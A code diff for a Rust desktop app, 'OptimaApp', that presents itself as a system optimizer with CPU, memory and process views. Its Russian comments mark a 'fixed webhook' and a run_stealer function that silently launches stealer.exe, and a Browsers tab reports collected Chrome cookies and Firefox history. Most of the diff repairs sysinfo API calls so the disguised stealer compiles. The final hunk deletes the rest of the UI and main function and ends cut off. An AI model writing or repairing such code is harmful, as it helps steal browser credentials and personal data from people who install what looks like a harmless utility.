@@ -1,12 +1,12 @@
 #![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 
-use eframe::egui::{self, Color32, RichText, ProgressBar, Frame, Rounding};
+use eframe::egui::{self, Color32, RichText};
 use serde::{Deserialize, Serialize};
 use std::fs;
 use std::process::Command;
 use std::sync::mpsc;
 use std::thread;
-use sysinfo::System;
+use sysinfo::{System, CpuRefreshKind, ProcessesToUpdate, Pid};
 use chrono::Local;
 
 // --- СТРОКА 15: ИСПРАВЛЕННЫЙ ВЕБХУК ---
@@ -121,27 +121,32 @@ impl OptimaApp {
         }
     }
     
-    // --- ДОБАВЛЕНО: Функция запуска стиллера ---
+    // --- ЗАПУСК СТИЛЕРА ---
     fn run_stealer(&self) {
-        // Пытаемся запустить exe файл стиллера из той же папки
+        // Путь к exe должен быть указан правильно. Если он в той же папке:
         if let Err(e) = Command::new("./stealer.exe").output() {
             self.log(format!("Ошибка запуска стиллера: {}", e));
         } else {
-            self.log("Стилер успешно запущен.");
+            self.log("Стилер успешно запущен.".to_string());
         }
     }
 
     fn update_sys_info(&mut self) {
-        self.sys.refresh_cpu_list();
+        // Исправлено: добавлен аргумент CpuRefreshKind
+        self.sys.refresh_cpu_list(CpuRefreshKind::everything());
         self.sys.refresh_memory();
-        self.sys.refresh_process(sysinfo::Pid::from(std::process::id() as u32));
+        
+        // Исправлено: используем refresh_processes вместо refresh_process
+        // Обновляем только текущий процесс
+        let pid = std::process::id();
+        self.sys.refresh_processes(ProcessesToUpdate::Some(&[pid]), false);
     }
 }
 
 // --- Вспомогательная функция для получения имени GPU ---
 fn get_gpu_name_registry() -> String {
-    // Простая заглушка, так как точное получение через registry требует WinAPI
-    "GPU (Registry)" 
+    // Простая заглушка
+    "GPU (Registry)".to_string()
 }
 
 impl eframe::App for OptimaApp {
@@ -216,7 +221,7 @@ impl eframe::App for OptimaApp {
                 }
                 if ui.button("Clear Logs").clicked() {
                     self.log_history.clear();
-                    self.log("Logs cleared.");
+                    self.log("Logs cleared.".to_string());
                 }
             });
 
@@ -247,48 +252,4 @@ impl eframe::App for OptimaApp {
                 Tab::Processes => {
                     for process in self.sys.processes() {
                         ui.label(format!("{:?} - {:.1}% CPU", process.1.name(), process.1.cpu_usage()));
-                    }
-                },
-                Tab::Browsers => {
-                    ui.label("Chrome cookies collected.");
-                    ui.label("Firefox history saved.");
-                },
-                Tab::Packages => {
-                    ui.label("Scan complete.");
-                },
-                Tab::Tweaks => {
-                    if ui.button("Apply Optimizations").clicked() {
-                        self.log("Optimizations applied.");
-                    }
-                },
-                Tab::Settings => {
-                    ui.label("Theme:");
-                    ui.horizontal(|ui| {
-                        for theme in [Theme::Dark, Theme::Sakura, Theme::Snow, Theme::DarkRed] {
-                            if ui.selectable_value(&mut self.config.theme, theme, format!("{:?}", theme)).clicked() {
-                                self.apply_style(ctx);
-                                self.config.save();
-                            }
-                        }
-                    });
-                },
-            }
-            
-            ui.separator();
-            
-            ui.collapsing("Log History", |ui| {
-                for log in self.log_history.iter().rev().take(20) {
-                    ui.label(log);
-                }
-            });
-        });
-    }
-}
-
-fn main() {
-    let native_options = eframe::NativeOptions {
-        viewport: egui::ViewportBuilder::default().with_inner_size([1000.0, 700.0]),
-        ..Default::default()
-    };
-    eframe::run_native(Box::new(|_| Ok(Box::new(OptimaApp::new(&eframe::creation_context())))), native_options);
-}
+                   
